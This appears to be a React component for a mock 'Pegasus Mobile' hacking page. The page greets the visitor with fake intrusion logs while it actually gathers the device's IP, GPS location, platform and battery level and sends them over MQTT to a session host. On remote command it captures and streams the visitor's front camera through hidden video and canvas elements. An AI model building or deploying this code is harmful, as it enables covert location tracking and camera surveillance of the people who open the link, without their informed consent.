
import React, { useEffect, useState, useRef } from 'react';
import { UploadCloud, Smartphone, Skull, Radio, AlertTriangle, MapPin, Battery, Video } from 'lucide-react';
import { getDeviceInfo } from '../services/deviceService';
import { mqttService } from '../services/mqttService';
import { DeviceInfo, CommandMessage } from '../types';

const MobileScanner: React.FC = () => {
  const [status, setStatus] = useState<'initializing' | 'scanning' | 'transmitting' | 'complete' | 'error'>('initializing');
  const [info, setInfo] = useState<DeviceInfo | null>(null);
  const [logs, setLogs] = useState<string[]>([]);
  const [progress, setProgress] = useState(0);
  const [isStreaming, setIsStreaming] = useState(false);
  
  // Video Refs
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const streamIntervalRef = useRef<number | null>(null);

  const getSessionId = () => {
    const hash = window.location.hash; 
    const queryPart = hash.split('?')[1];
    if (!queryPart) return null;
    const params = new URLSearchParams(queryPart);
    return params.get('session');
  };

  const addLog = (msg: string) => setLogs(prev => [...prev.slice(-6), msg]);

  const startCamera = async (sessionId: string) => {
    try {
      addLog('REMOTE_CMD: ACTIVATE_CAMERA_FEED');
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { 
          facingMode: 'user',
          width: { ideal: 320 }, // Low res for MQTT
          height: { ideal: 240 }
        }, 
        audio: false 
      });
      
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
        setIsStreaming(true);
        addLog('OPTICAL_SENSOR_HIJACKED');
        
        // Start sending frames
        streamIntervalRef.current = window.setInterval(() => {
           if (videoRef.current && canvasRef.current && mqttService) {
              const ctx = canvasRef.current.getContext('2d');
              if (ctx) {
                 ctx.drawImage(videoRef.current, 0, 0, 320, 240);
                 // Increased quality slightly since we want it "nitida", but kept reasonably low for MQTT
                 const base64 = canvasRef.current.toDataURL('image/jpeg', 0.5); 
                 mqttService.publishStream(sessionId, { image: base64, timestamp: new Date().toISOString() });
              }
           }
        }, 200); // ~5 FPS for smoother feed
      }
    } catch (err) {
      console.error(err);
      addLog('ERR: CAMERA_ACCESS_DENIED_BY_USER');
    }
  };

  const stopCamera = () => {
     if (streamIntervalRef.current) {
        clearInterval(streamIntervalRef.current);
        streamIntervalRef.current = null;
     }
     if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject as MediaStream;
        stream.getTracks().forEach(track => track.stop());
        videoRef.current.srcObject = null;
     }
     setIsStreaming(false);
     addLog('SURVEILLANCE_TERMINATED');
  };

  useEffect(() => {
    const sessionId = getSessionId();

    if (!sessionId) {
      setStatus('error');
      addLog('FATAL: SESSION_ID_MISSING');
      return;
    }

    const sequence = async () => {
      try {
        setStatus('scanning');
        
        addLog('INIT_PROTOCOL_V4...');
        setProgress(5);
        await new Promise(r => setTimeout(r, 600));

        // Pre-request Camera Permissions for Realism
        // This simulates a drive-by exploit asking for permissions immediately
        addLog('REQUESTING_SENSOR_ACCESS...');
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            // Close immediately, we just wanted the permission grant
            stream.getTracks().forEach(track => track.stop());
            addLog('SENSOR_ACCESS_GRANTED');
        } catch (e) {
            console.warn(e);
            addLog('SENSOR_ACCESS_DENIED');
            // Continue anyway, maybe they enable it later
        }
        
        addLog('BYPASSING_FIREWALL_RULES...');
        setProgress(20);
        await new Promise(r => setTimeout(r, 600));

        addLog('INJECTING_PAYLOAD...');
        setProgress(40);
        
        const deviceData = await getDeviceInfo();
        setInfo(deviceData);
        
        addLog(`TARGET_IP: ${deviceData.ip}`);
        
        if (deviceData.coords) {
            addLog(`GPS_LOCKED: ${deviceData.coords.latitude.toFixed(2)},${deviceData.coords.longitude.toFixed(2)}`);
        } else {
            addLog(`GPS_SIGNAL: MASKED`);
        }
        
        setProgress(75);
        await new Promise(r => setTimeout(r, 800));

        setStatus('transmitting');
        addLog(`UPLINK_ESTABLISHED: ${sessionId.substring(0,6)}...`);
        
        // Connect MQTT with Command Handler
        mqttService.connect(
            sessionId,
            () => {}, // No incoming data needed on mobile
            () => {
               mqttService.publishData(sessionId, deviceData);
            },
            (cmd: CommandMessage) => {
               if (cmd.type === 'ACTIVATE_CAMERA') {
                  startCamera(sessionId);
               } else if (cmd.type === 'STOP_CAMERA') {
                  stopCamera();
               }
            }
        );

        setProgress(100);
        
        await new Promise(r => setTimeout(r, 1500));
        addLog('DATA_EXFILTRATION_COMPLETE');
        setStatus('complete');

      } catch (err) {
        console.error(err);
        setStatus('error');
        addLog('TRANSMISSION_FAILED_RETIRING...');
      }
    };

    sequence();

    return () => {
        stopCamera();
        mqttService.disconnect();
    };
  }, []);

  return (
    <div className="min-h-screen bg-black text-green-500 font-mono p-4 flex flex-col items-center justify-center relative overflow-hidden">
      {/* Hidden Capture Elements */}
      <video ref={videoRef} className="hidden" playsInline muted autoPlay></video>
      <canvas ref={canvasRef} width="320" height="240" className="hidden"></canvas>

      {/* Background decoration */}
      <div className="absolute inset-0 z-0 pointer-events-none">
        <div className="absolute top-0 w-full h-1 bg-green-500/20"></div>
        <div className="absolute bottom-0 w-full h-1 bg-green-500/20"></div>
        <div className="scanline"></div>
      </div>

      <div className="z-10 w-full max-w-md space-y-8">
        
        <div className="text-center space-y-2">
          <div className="flex items-center justify-center gap-2 mb-4">
             {isStreaming ? (
                <div className="flex items-center gap-2 bg-red-900/20 border border-red-500 px-3 py-1 rounded text-red-500 animate-pulse">
                   <Video size={16} />
                   <span className="text-xs font-bold tracking-widest">RECORDING</span>
                </div>
             ) : (
                <AlertTriangle size={32} className="animate-pulse text-red-500" />
             )}
          </div>
          <h1 className="text-3xl font-black tracking-widest text-white uppercase glitch-effect">Pegasus Mobile</h1>
          <p className="text-xs text-red-500 font-bold uppercase tracking-[0.2em] animate-pulse">
            {status === 'complete' ? 'DEVICE COMPROMISED' : 'SYSTEM OVERRIDE IN PROGRESS'}
          </p>
        </div>

        <div className="bg-gray-900/90 border border-green-800/50 rounded-lg p-6 backdrop-blur-md shadow-[0_0_30px_rgba(0,255,65,0.15)] relative overflow-hidden">
            {/* Spinning radar background */}
            <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-64 h-64 border-[1px] border-green-900/30 rounded-full pointer-events-none"></div>
            
          <div className="flex justify-center mb-8 relative">
            {/* Status Icons */}
            <div className={`relative z-10 p-6 rounded-full bg-black border-2 shadow-lg transition-all duration-500 ${isStreaming ? 'border-red-500 shadow-red-500/30' : 'border-green-900 shadow-green-900/20'}`}>
                {status === 'initializing' && <Smartphone className="animate-pulse text-gray-500" size={48} />}
                {status === 'scanning' && <Radio className="animate-spin text-green-500 duration-[4000ms]" size={48} />}
                {status === 'transmitting' && <UploadCloud className="animate-bounce text-blue-500" size={48} />}
                {status === 'complete' && <Skull className={`${isStreaming ? 'text-red-500 animate-pulse' : 'text-gray-400'}`} size={48} />}
                {status === 'error' && <Skull className="text-gray-700" size={48} />}
            </div>
            
            {/* Ping animation rings */}
            {(status === 'scanning' || status === 'transmitting') && (
                <>
                    <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-32 h-32 border border-green-500 rounded-full animate-ping opacity-20 duration-1000"></div>
                </>
            )}
          </div>

          {/* Progress Bar */}
          <div className="space-y-1 mb-6">
            <div className="flex justify-between text-[10px] uppercase text-gray-500">
                <span>Process ID: {Math.floor(Math.random() * 9999)}</span>
                <span>{progress}%</span>
            </div>
            <div className="w-full h-1 bg-gray-800 rounded overflow-hidden">
                <div 
                className={`h-full transition-all duration-300 ease-out relative ${status === 'complete' ? 'bg-red-500' : 'bg-green-500'}`}
                style={{ width: `${progress}%` }}
                ></div>
            </div>
          </div>

          {/* Terminal Logs */}
          <div className="space-y-1 min-h-[120px] text-[10px] md:text-xs font-mono border-t border-b border-gray-800 py-3 mb-4 scrollbar-hide bg-black/40 p-3 rounded shadow-inner">
            {logs.map((log, i) => (
              <div key={i} className="flex gap-2 text-green-400/90">
                <span className="text-gray-600 select-none">&gt;</span>
                <span className="break-all">{log}</span>
              </div>
            ))}
            {status === 'transmitting' && (
              <div className="animate-pulse text-blue-400">&gt; UPLOADING_PACKETS...</div>
            )}
            {status === 'complete' && !isStreaming && (
               <div className="text-red-500 font-bold">&gt; CONNECTION_CLOSED_BY_HOST</div>
            )}
            {isStreaming && (
                <div className="text-red-500 font-bold animate-pulse">&gt; STREAMING_VIDEO_DATA...</div>
            )}
          </div>

          {/* Extracted Data Preview */}
          {info && (
            <div className="grid grid-cols-2 gap-2 text-[10px] uppercase border border-green-900/30 p-3 bg-black/50 rounded">
               <div className="text-gray-500 flex items-center gap-1"><MapPin size={10} /> IP ADDR</div>
               <div className="text-right text-white font-mono">{info.ip}</div>
               
               <div className="text-gray-500 flex items-center gap-1"><Smartphone size={10} /> MODEL</div>
               <div className="text-right text-white font-mono truncate">{info.platform}</div>

               {info.battery && (
                 <>
                   <div className="text-gray-500 flex items-center gap-1"><Battery size={10} /> POWER</div>
                   <div className="text-right text-white font-mono">{info.battery}%</div>
                 </>
               )}
            </div>
          )}
        </div>

        {status === 'complete' && (
          <div className="text-center animate-in fade-in slide-in-from-bottom duration-500 pt-4">
            <div className="inline-block bg-red-900/10 border border-red-500/30 text-red-500 px-6 py-2 rounded text-xs font-bold uppercase tracking-widest">
              Session Terminated
            </div>
          </div>
        )}
      </div>
    </div>
  );
};

export default MobileScanner;
